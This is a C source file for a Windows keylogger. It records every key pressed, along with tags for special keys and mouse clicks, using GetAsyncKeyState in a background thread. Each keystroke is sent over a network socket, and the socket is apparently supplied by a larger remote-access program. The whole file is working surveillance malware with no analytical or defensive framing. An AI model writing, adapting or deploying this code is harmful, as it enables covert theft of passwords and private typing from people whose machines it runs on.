#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <windows.h>

#define FULL_KEYBOARD_KEY_NUMBER 104

int keyloggerRunning = 0;

void change_active(int change) {
    keyloggerRunning = change;
}

void keylogger_main(SOCKET socket) {
        printf("in keylogger.c %d\n", keyloggerRunning);
    while (keyloggerRunning) {
        char buffer[1024];
        ZeroMemory(buffer, sizeof(buffer));

        if (buffer[0] == 'k' && buffer[1] == 's') return;

        char keyLogger[256];
        for (int i = 0; i < 256; i++) {
            if (GetAsyncKeyState(i) & 0b1) {
                printf("%c\n", i);
                // Handle character logging
                if (i > 32 && i < 127) {
                    sprintf(keyLogger, "%c", (char)i);
                    send(socket, keyLogger, sizeof(keyLogger), 0);
                    ZeroMemory(keyLogger, sizeof(keyLogger));
                } else {
                    // Handle special keys
                    switch (i) {
                        case VK_ESCAPE: sprintf(keyLogger, "[esc]"); send(socket, keyLogger, sizeof(keyLogger), 0); ZeroMemory(keyLogger, sizeof(keyLogger)); break;
                        case VK_TAB: sprintf(keyLogger, "[tab]"); send(socket, keyLogger, sizeof(keyLogger), 0); ZeroMemory(keyLogger, sizeof(keyLogger)); break;
                        case VK_SPACE: sprintf(keyLogger, " "); send(socket, keyLogger, sizeof(keyLogger), 0); ZeroMemory(keyLogger, sizeof(keyLogger)); break;
                        case VK_BACK: sprintf(keyLogger, "[backspace]"); send(socket, keyLogger, sizeof(keyLogger), 0); ZeroMemory(keyLogger, sizeof(keyLogger)); break;
                        case VK_RETURN: sprintf(keyLogger, "[return]"); send(socket, keyLogger, sizeof(keyLogger), 0); ZeroMemory(keyLogger, sizeof(keyLogger)); break;
                        case VK_CAPITAL: sprintf(keyLogger, "[caps]"); send(socket, keyLogger, sizeof(keyLogger), 0); ZeroMemory(keyLogger, sizeof(keyLogger)); break;
                        case VK_SHIFT: sprintf(keyLogger, "[shift]"); send(socket, keyLogger, sizeof(keyLogger), 0); ZeroMemory(keyLogger, sizeof(keyLogger)); break;
                        case VK_CONTROL: sprintf(keyLogger, "[control]"); send(socket, keyLogger, sizeof(keyLogger), 0); ZeroMemory(keyLogger, sizeof(keyLogger)); break;
                        case 1: sprintf(keyLogger, "[r_click]"); send(socket, keyLogger, sizeof(keyLogger), 0); ZeroMemory(keyLogger, sizeof(keyLogger)); break;
                        case 2: sprintf(keyLogger, "[l_click]"); send(socket, keyLogger, sizeof(keyLogger), 0); ZeroMemory(keyLogger, sizeof(keyLogger)); break;
                    }
                }
            }
        }
        ZeroMemory(keyLogger, sizeof(keyLogger));
    }
}

void keylogger(const SOCKET socket) {
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keylogger_main, socket, 0, NULL);
}
